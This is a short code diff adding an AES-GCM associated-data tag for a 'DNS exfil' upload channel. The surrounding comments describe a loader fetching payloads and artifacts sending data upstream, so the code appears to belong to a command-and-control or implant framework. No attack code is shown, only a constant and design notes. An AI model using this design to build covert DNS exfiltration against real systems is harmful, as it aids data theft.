@@ -107,6 +107,18 @@ public static class AesGcmEnvelope
     public static ReadOnlySpan<byte> DnsStagedAad => "rod-dns-staged-v1"u8;
 
     /// <summary>
+    /// The upstream exfil arm's blob tag (ADR-010, the upload arm): each
+    /// <c>u.</c> upload stream a keyed artifact sends reassembles into one
+    /// sealed ExfilChunk slice under this tag. The upload arm over DNS is
+    /// sealed-only -- a plaintext reassembly is dropped rather than
+    /// tolerated the way <c>r.</c>/<c>c.</c> do -- because MB-scale
+    /// upstream runs would otherwise hand a forger the artifact store keyed
+    /// by a task id the query name already leaks; the seal authenticates
+    /// possession of the baked key before any byte places.
+    /// </summary>
+    public static ReadOnlySpan<byte> DnsExfilAad => "rod-dns-exfil-v1"u8;
+
+    /// <summary>
     /// The AAD binding the loader tier's sealed payload fetch to its purpose:
     /// the fetch route serves the delivered payload as a raw R1 body under
     /// this tag, so no other purpose's ciphertext (a contact body, an enroll
